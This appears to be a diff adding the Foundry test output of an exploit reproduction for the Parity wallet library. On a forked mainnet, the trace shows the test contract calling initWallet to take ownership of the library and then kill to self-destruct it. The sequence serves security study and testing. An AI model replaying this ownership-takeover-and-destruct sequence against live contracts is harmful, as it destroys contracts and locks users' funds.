@@ -1,0 +1,40 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Parity_kill_exp.sol:ContractTest
+[PASS] testExploit() (gas: 216749)
+Traces:
+  [5795] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 4501735 [4.501e6])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [236649] ContractTest::testExploit()
+    ├─ [2598] WalletLibrary::isOwner(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] false
+    ├─ [114881] WalletLibrary::initWallet([0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 0)
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 2
+    │   │   @ 0x1135e4e44038ee15611247362d11682dc09f56122cfa8ae92844e35c9b54f535: 0 → 2
+    │   │   @ 7: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 6: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 4: 0 → 17476
+    │   └─ ← [Stop]
+    ├─ [598] WalletLibrary::isOwner(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [60402] WalletLibrary::kill(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ emit Confirmation(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], operation: 0x0e6751dbbd1614048d0b02eaa96ae3278841581dd451e01e83978ae7174c6a7c)
+    │   ├─  storage changes:
+    │   │   @ 263: 0 → 1
+    │   └─ ← [SelfDestruct]
+    ├─ [598] WalletLibrary::isOwner(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] true
+    ├─  storage changes:
+    │   @ 32: 0 → 1
+    │   @ 0xc97bfaf2f8ee708c303a06d134f5ecd8389ae0432af62dc132a24118292866bb: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.33s (2.85s CPU time)
+
+Ran 1 test suite in 5.64s (4.33s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
